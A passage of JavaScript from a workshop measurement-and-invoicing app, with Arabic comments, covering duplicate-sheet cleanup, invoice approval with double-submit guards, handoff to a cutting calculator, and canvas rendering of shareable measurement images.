    let _dupWarnedFor = '';

    function findSheetsByName(name) {
      const key = (name || '').trim().toLowerCase();
      if (!key) return [];
      return archives.filter(a => {
        const n = ((a.data && a.data.custName) || '').trim().toLowerCase();
        return n && n === key && a.id !== currentArchiveDocId;
      });
    }

    /* ══ تنظيف الكراسات المكرّرة القديمة ══
       القفل يمنع تكراراً جديداً، لكنه لا يمسّ ما أُنشئ قبله. والبيانات
       القائمة فيها غالباً كراسات فارغة بنفس الاسم — أثر الخلل: كانت
       تُنشأ مع كل حرف قبل أن يُضاف أي مقاس.

       نحذف **الفارغة وحدها**: لا مقاسات ولا بنود مالية ولا رسوم. وأي
       كراسة فيها عمل — ولو مقاس واحد — تبقى مهما تكرّر اسمها، فقد تكون
       شغلاً حقيقياً منفصلاً لنفس الزبون. والحذف نقل للسلة لا محو. */
    /* ⚠️ 9.0.3 — تنظيف الكراسات المكرّرة الحقيقية (لا الفارغة وحدها).

       findEmptyDuplicates أدناه لا تلتقط إلا الكراسات الفارغة تماماً —
       وهي أسهل الحالات وأقلّها ضرراً. أمّا التي تُتعب صاحب المحل فهي
       الكراسة المكتملة التي تكرّرت: نفس الزبون ونفس المقاسات، فيفتح
       واحدة ويعدّلها ثم يجد الورشة تعمل على الأخرى.

       المعيار هنا: نفس الاسم + نفس بصمة المقاسات (jobsFingerprint).
       والمُبقاة هي **الأحدث تعديلاً** لا الأقدم — عكس الفواتير عمداً:
       الفاتورة سجلّ لحظة فالأصل أولها، والكراسة عملٌ متواصل فالأصل
       آخر ما وصل إليه.

       وما كان معتمداً (approved) لا يُمسّ إطلاقاً: عليه فاتورة مرتبطة،
       وحذفه يقطع الصلة بين الفاتورة وكراستها. */
    function findDuplicateSheets() {
      const groups = {};
      (archives || []).forEach(a => {
        const nm = ((a.data && a.data.custName) || '').trim();
        const fp = jobsFingerprint(a.data);
        if (!nm || !fp) return;
        (groups[nm + '#' + fp] = groups[nm + '#' + fp] || []).push(a);
      });
      const out = [];
      Object.values(groups).forEach(g => {
        if (g.length < 2) return;
        const sorted = g.slice().sort((x, y) => (y.updatedAt || 0) - (x.updatedAt || 0));
        const extras = sorted.slice(1).filter(a => !a.approved);   // نُبقي الأحدث
        if (extras.length) out.push({ name: ((sorted[0].data || {}).custName || '').trim(),
                                      keep: sorted[0], extras: extras });
      });
      return out;
    }

    function cleanDuplicateSheets() {
      if (!isManagerUser()) { alert('⛔ حذف الكراسات متاح للمدير فقط.'); return; }
      const groups = findDuplicateSheets();
      if (!groups.length) { alert('✅ لا توجد كراسات مكرّرة بنفس الزبون ونفس المقاسات.'); return; }

      let total = 0;
      let msg = '⚠️ وُجدت ' + groups.length + ' مجموعة كراسات مكرّرة\n(نفس الزبون ونفس المقاسات تماماً)\n\n';
      groups.slice(0, 10).forEach(g => {
        total += g.extras.length;
        const cnt = ((g.keep.data || {}).jobList || []).length;
        msg += '• ' + g.name + ' — ' + cnt + ' مقاساً\n';
        msg += '    تُبقى الأحدث، وتُحذف ' + g.extras.length + ' نسخة\n';
      });
      groups.slice(10).forEach(g => { total += g.extras.length; });
      if (groups.length > 10) msg += '… و' + (groups.length - 10) + ' مجموعة أخرى\n';
      msg += '\nالمجموع: ' + total + ' كراسة زائدة.\n' +
             'تُنقل إلى سلة المهملات ويمكن استرجاعها.\n' +
             '(الكراسات المعتمدة لا تُمسّ — عليها فواتير مرتبطة.)';

      if (!confirm(msg)) return;
      let done = 0;
      groups.forEach(g => g.extras.forEach(a => {
        try {
          fsUpdate('measurementJobs', a.id, {
            deleted: true, deletedAt: Date.now(),
            deletedBy: (window.currentShopUser && window.currentShopUser.name) || ''
          });
          done++;
        } catch (e) { console.error('dup sheet', a.id, e); }
      }));
      showMiniToast('✅ نُقلت ' + done + ' كراسة مكرّرة إلى السلة', '#047480');
    }

    function findEmptyDuplicates() {
      const out = [];
      const byName = {};
      archives.forEach(a => {
        const nm = ((a.data && a.data.custName) || '').trim();
        if (!nm) return;
        (byName[nm] = byName[nm] || []).push(a);
      });
      Object.keys(byName).forEach(nm => {
        const group = byName[nm];
        if (group.length < 2) return;          // اسم غير مكرر: لا شيء
        group.forEach(a => {
          const d = a.data || {};
          const noItems = !Array.isArray(d.jobList) || d.jobList.length === 0;
          const noBill  = !Array.isArray(d.billData) || d.billData.length === 0;
          if (noItems && noBill && !a.approved) out.push(a);
        });
      });
      return out;
    }

    function cleanEmptyDuplicates() {
      if (!isManagerUser()) { alert('⛔ متاح للمدير فقط.'); return; }
      const dups = findEmptyDuplicates();
      if (!dups.length) { alert('✅ لا توجد كراسات مكرّرة فارغة.'); return; }

      const names = {};
      dups.forEach(a => { const n = ((a.data && a.data.custName) || '').trim(); names[n] = (names[n]||0)+1; });
      const lines = Object.keys(names).slice(0, 8).map(n => '   • ' + n + ' (' + names[n] + ')').join('\n');

      if (!confirm('وُجدت ' + dups.length + ' كراسة مكرّرة **فارغة** (بلا مقاسات ولا بنود):\n\n' +
                   lines + (Object.keys(names).length > 8 ? '\n   …' : '') + '\n\n' +
                   'نقلها إلى سلة المهملات؟\n' +
                   'الكراسات التي فيها عمل لن تُمسّ، ويمكن استرجاع أي شيء من السلة.')) return;

      let n = 0;
      dups.forEach(a => {
        if (a.id === currentArchiveDocId) return;   // لا نمسّ المفتوحة الآن
        fsUpdate('measurementJobs', a.id, {
          deleted: true, deletedAt: Date.now(),
          deletedBy: (window.currentShopUser && window.currentShopUser.name) || '',
          deletedReason: 'تنظيف كراسات مكرّرة فارغة'
        });
        n++;
      });
      alert('✅ نُقلت ' + n + ' كراسة إلى سلة المهملات.');
    }
    window.cleanEmptyDuplicates = cleanEmptyDuplicates;

    /* ⚠️ تنبيه «نفس الزبون بنفس المقاسات» — 9.0.2

       يختلف عن checkDuplicateCustomer أدناه اختلافاً جوهرياً: ذاك ينبّه
       على تكرار **الاسم** وحده، وهو أمر شائع ومشروع (زبون له عدة أعمال).
       وهذا ينبّه على تطابق **المقاسات نفسها** — وذلك لا يقع إلا في حالتين:
       إمّا أن الكراسة كُرِّرت بالخطأ، وإمّا أن العمل يُعاد فعلاً. وفي
       الحالتين معرفةُ ذلك أفضل من جهله.

       والبصمة هنا مقصورة على jobList (النوع والعرض والارتفاع) — لا تشمل
       الفاتورة ولا الملاحظات: فالمقاسات هي ما يُقارَن في الورشة. */
    function jobsFingerprint(st) {
      try {
        const j = (st && st.jobList) || [];
        if (!j.length) return '';
        return j.map(i => [i.type, i.w, i.h].join('|')).sort().join(';');
      } catch (e) { return ''; }
    }

    let _dupHintTimer = null;
    function scheduleDuplicateSheetHint() {
      if (_dupHintTimer) clearTimeout(_dupHintTimer);
      /* تأخير قصير: saveCurrentState تُستدعى مع كل حرف، ومقارنة البصمة
         بكل الأرشيف في كل ضغطة زر تُثقل الكتابة بلا داعٍ. */
      _dupHintTimer = setTimeout(checkDuplicateSheetHint, 450);
    }

    function checkDuplicateSheetHint() {
      const box = document.getElementById('dupSheetHint');
      if (!box) return;
      const name = ((document.getElementById('custName') || {}).value || '').trim();
      const fp = jobsFingerprint(buildStateSnapshot());
      if (!name || !fp) { box.style.display = 'none'; return; }

      const twin = (archives || []).find(a =>
        !a.deleted && a.id !== currentArchiveDocId &&
        String((a.data && a.data.custName) || '').trim() === name &&
        jobsFingerprint(a.data) === fp
      );
      if (!twin) { box.style.display = 'none'; return; }

      const when = twin.updatedAt ? new Date(twin.updatedAt).toLocaleDateString('ar-EG') : '';
      const cnt  = (twin.data && twin.data.jobList) ? twin.data.jobList.length : 0;
      box.textContent = '⚠️ لهذا الزبون كراسة بنفس المقاسات (' + cnt + ' مقاساً)' +
                        (when ? ' — ' + when : '') + '. تأكّد أنها ليست نفسها قبل المتابعة.';
      box.style.display = 'block';
    }

    function checkDuplicateCustomer() {
      // نفس اسم العميل لا يعني كراسة قديمة: كل دخول جديد كراسة مستقلة.
      // لا نعرض أي تنبيه ولا نفتح أي كراسة تلقائيًا.
      return;
    }

    function approveAndSaveInvoice() {
      if (!requireMeasurementsAccess('اعتماد الخدمة')) return;
      /* ══ حارسا الاعتماد المزدوج ══
         الاعتماد يفتح حساباً في الفواتير. اعتماده مرتين يعني فاتورتين
         لنفس الشغل: يُطالَب الزبون بضعف قيمته، ويُخصم من المخزن مرتين،
         ويظهر دخل وهمي في تقارير اليوم.

         (1) قفل أثناء التنفيذ: ضغطتان متتاليتان سريعتان — وهذا يقع فعلاً
             على الجوال حين تتأخر الاستجابة لحظة فيضغط المستخدم ثانيةً.
         (2) قفل دائم بعد النجاح: يُحفظ مع الكراسة ويُستعاد معها، فلا
             تُعتمد كراسة محفوظة مرة أخرى عند فتحها من الأرشيف. */
      if (approvingNow) return;
      if (sheetApproval) {
        alert('✅ هذه الخدمة معتمدة بالفعل.\n\n' +
              'رقم حسابها في الفواتير: ' + (sheetApproval.invId || '—') + '\n' +
              'المدفوع عربوناً: ' + Number(sheetApproval.paid || 0).toFixed(2) + ' د.ل\n\n' +
              'لتعديل مبلغها أو بنودها افتحها من تطبيق الفواتير.');
        return;
      }

      const name  = document.getElementById('custName').value.trim();
      const phone = document.getElementById('custPhone').value.trim();
      if(!name) { alert('أدخل اسم العميل أولاً'); return; }

      const items = collectBillItems();
      if(items.length === 0) {
        alert('أضف بنداً مالياً واحداً على الأقل قبل الاعتماد (زر «إضافة بند مالي»)');
        return;
      }
      const uid = (window.currentShopUser && window.currentShopUser.uid) || '';
      if(!uid) { alert('⚠️ لم يكتمل التحقق من حسابك بعد — انتظر لحظة وأعد المحاولة.'); return; }

      const withTotals = items.map(i => ({ name: i.name, qty: i.qty, price: i.price, total: money2(i.qty * i.price) }));
      let itemsTotal = money2(withTotals.reduce((a,i) => a + (i.total||0), 0));

      /* المبلغ المعدَّل يُترجَم إلى لغة الفاتورة نفسها، لا يُمرَّر رقماً غريباً:
           أقل من المحسوب → خصم في حقل discount.
           أكثر منه       → بند «تسوية» يُضاف للأصناف.
         فتبقى معادلة الفاتورة صحيحة: الإجمالي = مجموع الأصناف − الخصم.
         وهذا شرط أن تعمل عليها كل أدوات الفواتير — التعديل والإرجاع
         وتوزيع الخصم — بلا استثناء لهذه الفاتورة. */
      /* المبلغ المعدَّل يصير **بنداً** في الفاتورة لا خصماً خفيّاً.
         الخصم أُلغي من النظام، وبنداً صريحاً أوضح على أي حال: يراه الزبون
         في فاتورته ويعرف على ماذا اتُّفق، بدل رقم مطروح بلا بيان. */
      const discount = 0;
      if (sheetTotalOverride !== null && itemsTotal > 0) {
        const diff = money2(itemsTotal - sheetTotalOverride);
        if (diff > 0) {
          withTotals.push({ name: 'تخفيض متفق عليه', qty: 1, price: money2(-diff), total: money2(-diff) });
          itemsTotal = money2(itemsTotal - diff);
        } else if (diff < 0) {
          withTotals.push({ name: 'إضافة متفق عليها', qty: 1, price: money2(-diff), total: money2(-diff) });
          itemsTotal = money2(itemsTotal + money2(-diff));
        }
      }
      const subtotal = money2(itemsTotal - discount);
      const cash       = readSheetPaid();
      const applied    = money2(Math.min(cash, subtotal));
      const overpay    = money2(cash - applied);
      const netDebt    = money2(Math.max(0, subtotal - applied));

      const msg = 'اعتماد الخدمة والبدء فيها؟\n\n' +
                  'العميل: ' + name + '\n' +
                  ((sheetTotalOverride !== null) ? ('المجموع المعدَّل مُدرَج كبند في الفاتورة\n') : '') +
                  'الإجمالي: ' + subtotal.toFixed(2) + ' د.ل\n' +
                  'المدفوع: ' + cash.toFixed(2) + ' د.ل\n' +
                  (netDebt > 0 ? ('الدين: ' + netDebt.toFixed(2) + ' د.ل\n') : '') +
                  (overpay > 0 ? ('رصيد للعميل: ' + overpay.toFixed(2) + ' د.ل\n') : '') +
                  '\nسيُفتح حساب الخدمة في الفواتير، وتُؤرشَف المقاسات وتُفرَّغ الكراسة.';
      if(!confirm(msg)) return;

      approvingNow = true;
      const invId = wsUid('INV-');
      const who   = (window.currentShopUser && window.currentShopUser.name) || '';
      const nowStr = new Date().toLocaleString('ar-EG');

      const inv = {
        id: invId, date: nowStr, timestamp: Date.now(),
        customerName: name, customerPhone: phone,
        items: withTotals, itemsTotal, discount, subtotal,
        paid: applied, cashReceived: cash, oldDebtPay: 0,
        netDebt, paymentType: 'كاش',
        signedBy: who, signedByUid: uid,
        creditUsed: 0, overpayCredited: overpay,
        fromMeasurements: true
      };

      try {
        fsSet('sales', invId, inv);

        if (cash > 0) {
          fsSet('payments', 'PAYINV-' + invId, {
            id: 'PAYINV-' + invId, invId,
            customerName: name, amount: cash, type: 'كاش',
            reason: 'دفعة عن الفاتورة ' + invId,
            date: nowStr, timestamp: Date.now(),
            signedBy: who, signedByUid: uid,
            receiverRole: (window.currentShopUser && window.currentShopUser.role) || '',
            debtDistribution: [{ saleId: invId, amountApplied: applied }],
            creditAdded: overpay
          });
        }

        /* الفائض رصيداً دائناً — بزيادة ذرّية لا بـ«اقرأ ثم اكتب».
           القراءة ثم الكتابة تخسر أي تعديل يقع بينهما: جهازان يعتمدان
           فاتورتين لنفس العميل في اللحظة نفسها فيقرأ كلاهما الرصيد القديم
           ويكتب فوق الآخر — فيضيع أحد المبلغين. والزيادة الذرّية يجمعها
           السيرفر ولا تحتاج قراءة، فتعمل دون اتصال أيضاً. */
        if (overpay > 0) {
          fsMergeIncrement('creditBalances', encodeURIComponent(name), 'amount', overpay, { name });
        }
      } catch(e) {
        approvingNow = false;   // فشل الحفظ: نفتح الزر ليعيد المحاولة
        console.error('approveAndSaveInvoice:', e);
        alert('⚠️ تعذّر حفظ الفاتورة: ' + (e && e.message ? e.message : e));
        return;
      }

      // نجح الحفظ: يُثبَّت القفل الدائم قبل أي شيء آخر
      setSheetApproval({ invId, paid: cash, at: Date.now() });
      approvingNow = false;

      /* لا نفرّغ خانة الدفع هنا: القفل يعرض فيها ما دُفع عربوناً.
         التفريغ يقع مع الكراسة الجديدة، لا الآن.
         والمقاسات انتهى دورها بمجرد اعتمادها: تُحفظ في الأرشيف وتُفرَّغ
         الكراسة تلقائياً حتى لا يبدأ الزبون التالي فوق مقاسات السابق. */
      const archivedOk = saveMeasurementsSheet('keep');

      /* وسم الكراسة في الأرشيف بأنها معتمدة.
         يُكتب **بعد** الأرشفة لأن معرّف المستند لا يُعرف قبلها.
         مع وضع keep يبقى الارتباط قائماً فنقرأ currentArchiveDocId مباشرةً،
         ونرجع إلى lastSavedSheet احتياطاً. */
      const approvedDocId = currentArchiveDocId || (lastSavedSheet && lastSavedSheet.id) || '';
      if (archivedOk !== false && approvedDocId) {
        const approvedAtNow = Date.now();
        const approvePatch = {
          approved: true,
          approvedInvId: invId,
          approvedAt: approvedAtNow,
          approvedBy: who,
          approvedTotal: subtotal,
          approvedPaid: cash
        };
        fsUpdate('measurementJobs', approvedDocId, approvePatch);
        patchArchiveLocal(approvedDocId, approvePatch);
      }
      /* الكراسة تبقى معروضة بحالتها المعتمدة — الزر أخضر ورقم الحساب ظاهر
         وخانة العربون مقفولة. وتُجمَّد للقراءة: مقاساتها صارت مرتبطة بفاتورة،
         وتعديلها هنا لا يغيّر شيئاً هناك فيفترق الرقمان.
         التفريغ للزبون التالي يقع بزر «حفظ المقاسات وبدء كراسة جديدة»،
         أو تلقائياً بعد نصف ساعة من آخر مقاس. */
      setSheetViewOnly(true);
      applyApprovalLockUI();
      try { loadArchiveUI(); } catch (e) {}
      window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });

      alert('✅ اعتُمدت الخدمة وبدأ العمل فيها.\n' +
            'رقم حسابها في الفواتير: ' + invId +
            (netDebt > 0 ? ('\nالدين المسجَّل: ' + netDebt.toFixed(2) + ' د.ل') : '') +
            (overpay > 0 ? ('\nرصيد العميل: ' + overpay.toFixed(2) + ' د.ل') : '') +
            '\n\nالكراسة محفوظة في الأرشيف ومعروضة أمامك.\n' +
            'للزبون التالي: اضغط «حفظ المقاسات وبدء كراسة جديدة».');
    }

    // اسم قديم محفوظ للتوافق مع أي نداء متبقٍ
    function sendToInvoice() { approveAndSaveInvoice(); }

    // ===== الربط مع حاسبة القص =====
    // يرسل مع كل مقاس نوعه (بيفيسي/سرانتي/أي نوع مخصص) وملاحظته،
    // فتُكتب تلقائياً في خانة ملاحظات ذلك القياس داخل صفحة القص.
    // المقاسات المؤشَّرة بعلامة ✓ في العمود الأول من الجدول
    function getSelectedItems() { return jobList.filter(i => i.sel); }

    // تحديد الكل أو إلغاء التحديد بالضغط على رأس عمود ✓
    function toggleSelectAll() {
      if(jobList.length === 0) return;
      const allOn = jobList.every(i => i.sel);
      jobList.forEach(i => i.sel = !allOn);
      renderTable();
      syncSelectionTargetBill(true);
      saveCurrentState();
    }

    // عنوان زر القص يوضّح كم مقاساً سيُرسل فعلاً
    function updateCuttingBtnLabel() {
      const el = document.getElementById('cuttingBtnText');
      if(!el) return;
      const n = getSelectedItems().length;
      const total = jobList.length;
      if(total === 0) { el.textContent = 'إرسال المقاسات المحددة ✓ لحاسبة القص'; return; }
      el.textContent = (n === total)
        ? `إرسال كل المقاسات لحاسبة القص (${n})`
        : `إرسال المقاسات المحددة ✓ لحاسبة القص (${n} من ${total})`;
    }

    function sendToCutting() {
      if(jobList.length === 0) { alert('لا توجد مقاسات لإرسالها بعد'); return; }

      // لا يُرسل إلا ما عليه علامة ✓ داخل الجدول
      const selected = getSelectedItems();
      if(selected.length === 0) {
        alert('⚠️ لم تحدد أي مقاس.\n\nضع علامة ✓ في العمود الأول أمام المقاسات التي تريد إرسالها لحاسبة القص، أو اضغط رأس العمود لتحديد الكل.');
        return;
      }

      // تنبيه عند الإرسال الجزئي: علامة ✓ نفسها تتحكم في الإجماليات والبنود المالية
      if(selected.length < jobList.length) {
        const msg = `سيُرسل ${selected.length} مقاساً فقط من أصل ${jobList.length} إلى حاسبة القص.\n\n`
                  + 'تنبيه: نفس علامة ✓ تتحكم في إجمالي الأمتار والبنود المالية، فأعد تحديد الكل بعد الانتهاء '
                  + '(بالضغط على رأس عمود ✓).\n\nمتابعة؟';
        if(!confirm(msg)) return;
      }

      // نص الملاحظة = اسم النوع، ثم ملاحظة الكراسة إن وُجدت
      const noteOf = i => {
        const parts = [getTypeName(i.type)];
        if ((i.type === 'seranati' || i.type === SER_NORMAL_ID) && i.sk) parts.push(i.sk);
        if (i.type === 'pvc' && i.itemColor) parts.push(i.itemColor);
        if (i.note) parts.push(i.note);
        return parts.filter(Boolean).join(' - ');
      };

      const lines = selected.map(i => {
        const n = noteOf(i);
        return `${i.w} × ${i.h}` + (n ? ' ' + n : '');
      }).join('\n');

      const handoffPayload = {
        lines: lines,
        items: selected.map(i => ({ w: i.w, h: i.h, note: noteOf(i), img: i.img || '', cuttingFormula: i.cuttingFormula || '', cuttingProfile:i.cuttingProfile||'', formulaSnapshot:i.formulaSnapshot||null,openingLayout:i.openingLayout||null,accessoryExceptions:i.accessoryExceptions||{},executionId:i.executionId||'', formulaLabel: i.formulaLabel || '', openingDirection: i.openingDirection || '', cuttingSymbol:i.cuttingSymbol||'', symbolLabel:i.symbolLabel||'', leafLayout:i.leafLayout||'' })),
        customerName: document.getElementById('custName').value.trim(),
        customerPhone: document.getElementById('custPhone').value.trim(),
        customerLocation: custLocation || null,
        ts: Date.now()
      };
      if (!persistCuttingHandoff(handoffPayload)) return;
      window.location.href = 'cutting.html';
    }

    // وظائف المشاركة

    // حساب أعلى دقة (scale) ممكنة تلقائياً دون تجاوز الحدود القصوى الآمنة لحجم الكانفاس في المتصفحات
    function computeSafeScale(elW, elH, desired) {
      const MAX_DIMENSION = 8000;
      const MAX_AREA = 16000000;
      let scale = desired;
      if (elW * scale > MAX_DIMENSION) scale = MAX_DIMENSION / elW;
      if (elH * scale > MAX_DIMENSION) scale = Math.min(scale, MAX_DIMENSION / elH);
      if ((elW * scale) * (elH * scale) > MAX_AREA) scale = Math.sqrt(MAX_AREA / (elW * elH));
      return Math.max(1, scale);
    }

    // عرض شريحة معينة فقط من المقاسات في الجدول (لأغراض التقاط صورة صفحة واحدة فقط)
    function renderCaptureRows(items, startIdx) {
      let tbody = document.querySelector('#mainTable tbody'); tbody.innerHTML = '';
      const typeNumbers = computeTypeNumbers(jobList);
      items.forEach((i, localIdx) => {
        const num = typeNumbers[startIdx + localIdx];
        let r = tbody.insertRow();
        const isPaper = measurementViewMode === 'sheet';
        r.className = (isPaper ? 'measure-row ' : '') + i.type + '-row';
        if (isPaper) {
          r.innerHTML = `
            <td class="no-print"><input type="checkbox" ${i.sel?'checked':''} disabled></td>
            <td style="text-align:center;font-weight:500;color:#777;font-size:10px;">${num}</td>
            <td>${safeImgSrc(i.img)?`<img src="${safeImgSrc(i.img)}" style="width:28px;">`:''}</td>
            <td class="direct-cell" style="text-align:right">
              <div class="cell-type"><span translate="no" class="${safeCls(i.type)}-badge">${escHtml(getTypeName(i.type))}</span></div>
              ${measurementDiagramMarkup(i.w, i.h, i.type)}
              ${(i.sk || i.itemColor) ? `<small>${[i.sk,i.itemColor].filter(Boolean).map(escHtml).join(' · ')}</small>` : ''}
            ${measurementNoteMarkup(i.note)}
            </td>
            <td class="cell-size" aria-label="الناتج">${escHtml(i.res)}</td>
            <td class="no-print"></td>`;
        } else {
          r.innerHTML = `
            <td class="no-print"><input type="checkbox" ${i.sel?'checked':''} disabled></td>
            <td style="text-align:center; font-weight:bold; color:var(--muted); font-family:'JetBrains Mono',monospace;">${num}</td>
            <td>${safeImgSrc(i.img)?`<img src="${safeImgSrc(i.img)}" style="width:40px; border-radius:5px;">`:'-'}</td>
            <td style="text-align:right">
              <div class="cell-type"><span translate="no" class="${safeCls(i.type)}-badge">${escHtml(getTypeName(i.type))}</span></div>
              <div class="cell-size">${escHtml(i.w)} × ${escHtml(i.h)} ${i.sk?`<small>(${escHtml(i.sk)})</small>`:''} ${i.itemColor?`<small>(${escHtml(i.itemColor)})</small>`:''}</div>
            ${measurementNoteMarkup(i.note)}
            </td>
            <td style="font-weight:bold; min-width:110px; white-space:nowrap;" class="cell-size">${escHtml(i.res)}</td>
            <td class="no-print"></td>`;
        }
      });
    }

    // إنشاء صورة محلياً باستخدام Canvas الأصلي إذا تعذّر تحميل html2canvas.
    // لا يعتمد هذا المسار على CDN أو اتصال الإنترنت، ولا يغيّر بيانات الكراسة.
    function nativeCanvasBlob(canvas, type='image/png', quality=0.96) {
      return new Promise((resolve, reject) => {
        try { canvas.toBlob(b => b && b.size ? resolve(b) : reject(new Error('تعذّر تحويل اللوحة إلى صورة')), type, quality); }
        catch (e) { reject(e); }
      });
    }
    function drawRtlLine(ctx, text, x, y, maxWidth, font='28px Arial') {
      ctx.save(); ctx.direction = 'rtl'; ctx.textAlign = 'right'; ctx.font = font;
      const value = String(text == null ? '' : text);
      const words = value.split(/\s+/); let line = '', lines = [];
      for (const word of words) {
        const test = line ? line + ' ' + word : word;
        if (ctx.measureText(test).width > maxWidth && line) { lines.push(line); line = word; }
        else line = test;
      }
      if (line) lines.push(line);
      lines.forEach((ln, i) => ctx.fillText(ln, x, y + i * 38, maxWidth));
      ctx.restore(); return Math.max(1, lines.length) * 38;
    }
    function wrapMeasurementNote(ctx,note,maxWidth) {
      const lines=[];
      for(const paragraph of String(note||'').split(/\r?\n/)){
        let line='';
        for(const char of paragraph){
          if(line&&ctx.measureText(line+char).width>maxWidth){lines.push(line);line='';}
          line+=char;
        }
        lines.push(line);
      }
      return lines;
    }
    async function createNativeMeasurementsImage(pageItems, startIdx, pageNum, totalPages, isLastPage) {
      const width=1080,pad=54;
      const measureCanvas=document.createElement('canvas'),measureCtx=measureCanvas.getContext('2d');
      if(!measureCtx)throw new Error('Canvas context unavailable');
      measureCtx.font='22px Arial';
      const noteLines=pageItems.map(i=>i.note?wrapMeasurementNote(measureCtx,'ملاحظة: '+String(i.note),width-pad*2-180):[]);
      const rowHeights=noteLines.map(lines=>Math.max(132,112+lines.length*32+16));
      const billRows = isLastPage ? Array.from(document.querySelectorAll('.bill-row')).map(row => ({
        name: row.querySelector('.b-n')?.value?.trim() || '', qty: row.querySelector('.b-q')?.value || '0',
        price: row.querySelector('.b-p')?.value || '0', total: row.querySelector('.b-total')?.innerText || '0',
        auto: !!row.dataset.autoType
      })).filter(x => x.name) : [];
      const billHeight = billRows.length ? 110 + billRows.length * 62 + 100 : (isLastPage ? 130 : 0);
      const height = Math.max(400, 350 + rowHeights.reduce((a,b)=>a+b,0) + billHeight + (totalPages > 1 ? 60 : 0));
      const canvas = document.createElement('canvas'); canvas.width = width; canvas.height = height;
      const ctx = canvas.getContext('2d'); if (!ctx) throw new Error('Canvas context unavailable');
      ctx.fillStyle='#fff'; ctx.fillRect(0,0,width,height); ctx.textBaseline='alphabetic';
      ctx.fillStyle='#0f5132'; ctx.fillRect(pad, 42, width-pad*2, 5);
      const customer = document.getElementById('custName')?.value || 'زبون عام';
      ctx.fillStyle='#0f5132'; drawRtlLine(ctx, 'اللمسة الأخيرة — المقاسات', width-pad, 98, width-pad*2, 'bold 38px Arial');
      ctx.fillStyle='#24352d'; drawRtlLine(ctx, 'العميل: ' + customer, width-pad, 150, width-pad*2, 'bold 28px Arial');
      const phone = document.getElementById('custPhone')?.value || '';
      if(phone) drawRtlLine(ctx, 'الهاتف: ' + phone, width-pad, 194, width-pad*2, '24px Arial');
      ctx.fillStyle='#66756d'; ctx.font='22px Arial'; ctx.textAlign='left'; ctx.fillText(formatWesternDateTime(), pad, 230);
      if(totalPages>1) { ctx.textAlign='left'; ctx.fillText(`صفحة ${pageNum} من ${totalPages}`, pad, 266); }
      let y = totalPages>1 ? 310 : 280;
      ctx.fillStyle='#f0f5f2'; ctx.fillRect(pad,y,width-pad*2,56);
      ctx.fillStyle='#29483a'; ctx.font='bold 23px Arial'; ctx.textAlign='right'; ctx.direction='rtl'; ctx.fillText('رقم',width-pad-20,y+36); ctx.fillText('النوع والمقاس والملاحظات',width-pad-150,y+36); ctx.textAlign='left'; ctx.fillText('الناتج',pad+20,y+36); y += 56;
      const typeNumbers = computeTypeNumbers(jobList);
      pageItems.forEach((item, idx) => {
        const rh = rowHeights[idx];
        ctx.fillStyle = idx%2 ? '#ffffff' : '#fbfcfb'; ctx.fillRect(pad,y,width-pad*2,rh);
        ctx.strokeStyle='#e0e7e2'; ctx.beginPath(); ctx.moveTo(pad,y+rh); ctx.lineTo(width-pad,y+rh); ctx.stroke();
        ctx.fillStyle='#607168'; ctx.font='bold 23px Arial'; ctx.textAlign='right'; ctx.direction='rtl'; ctx.fillText(String(typeNumbers[startIdx+idx] ?? (startIdx+idx+1)),width-pad-20,y+42);
        ctx.fillStyle='#0f5132'; ctx.font='bold 25px Arial'; ctx.fillText(getTypeName(item.type),width-pad-110,y+42, width-pad*2-180);
        ctx.fillStyle='#1c2923'; ctx.font='bold 29px Arial'; ctx.fillText(`${item.w} × ${item.h}${item.sk ? ' ('+item.sk+')' : ''}${item.itemColor ? ' ('+item.itemColor+')' : ''}`,width-pad-110,y+82,width-pad*2-180);
        if(noteLines[idx].length) { ctx.fillStyle='#6c6254'; ctx.font='22px Arial'; noteLines[idx].forEach((line,n)=>ctx.fillText(line,width-pad-110,y+119+n*32)); }
        ctx.fillStyle='#0f5132'; ctx.font='bold 30px Arial'; ctx.textAlign='left'; ctx.direction='ltr'; ctx.fillText(String(item.res ?? ''),pad+20,y+55,150);
        y += rh;
      });
      if(isLastPage) {
        y += 24; ctx.fillStyle='#0f5132'; ctx.font='bold 28px Arial'; ctx.textAlign='right'; ctx.direction='rtl'; ctx.fillText('البنود المالية',width-pad,y+24); y+=42;
        if(!billRows.length) { ctx.fillStyle='#66756d'; ctx.font='23px Arial'; ctx.fillText('لا توجد بنود مالية',width-pad,y+22); y+=48; }
        billRows.forEach(row => {
          ctx.strokeStyle='#e0e7e2'; ctx.beginPath(); ctx.moveTo(pad,y+48); ctx.lineTo(width-pad,y+48); ctx.stroke();
          ctx.fillStyle='#24352d'; ctx.font=row.auto?'bold 23px Arial':'23px Arial'; ctx.textAlign='right'; ctx.direction='rtl'; ctx.fillText(row.name,width-pad-10,y+30,400);
          ctx.fillStyle='#1c2923'; ctx.font='22px Arial'; ctx.textAlign='left'; ctx.direction='ltr'; ctx.fillText(`${row.qty} × ${row.price} = ${row.total}`,pad+10,y+30,540); y+=58;
        });
        ctx.fillStyle='#edf5f0'; ctx.fillRect(pad,y,width-pad*2,72); ctx.fillStyle='#0f5132'; ctx.font='bold 29px Arial'; ctx.textAlign='right'; ctx.direction='rtl'; ctx.fillText('الإجمالي: '+(document.getElementById('grandTotal')?.innerText || '0')+' د.ل',width-pad-18,y+46);
      }
      return nativeCanvasBlob(canvas,'image/png');
    }

    // التقاط صورة صفحة واحدة تحتوي على شريحة من المقاسات (10 كحد أقصى) مع جودة كاملة
    async function captureMeasurementsPage(pageItems, startIdx, pageNum, totalPages, isLastPage) {
      renderCaptureRows(pageItems, startIdx);
      document.querySelectorAll('.no-print').forEach(el => el.style.display = 'none');

      document.getElementById('shareHeader').style.display = 'block';
      document.getElementById('shareCustName').innerText = document.getElementById('custName').value || 'زبون عام';
      let phoneVal = document.getElementById('custPhone').value;
      document.getElementById('sharePhone').innerText = phoneVal ? '📞 ' + phoneVal : '';
      document.getElementById('shareDate').innerText = formatWesternDateTime();
      document.getElementById('shareDate').style.display = 'block';

      const pageIndicator = document.getElementById('sharePageIndicator');
      if (totalPages > 1) {
        pageIndicator.innerText = `صفحة ${pageNum} من ${totalPages}`;
        pageIndicator.style.display = 'block';
      } else {
        pageIndicator.style.display = 'none';
      }

      /* لا إجمالي لكل صفحة إطلاقاً، ولا أمتار أنواع في وسط الكراسة.
         كانت كل صفحة تحمل تفصيل أنواعها ومجموعها، فيقرأ الزبون ثلاثة
         أرقام لنفس الشغل ويجمعها ظاناً أنها مبالغ مستقلة.
         الأمتار تُكتب مرة واحدة في نهاية الصفحة الأخيرة، ولكل نوع على
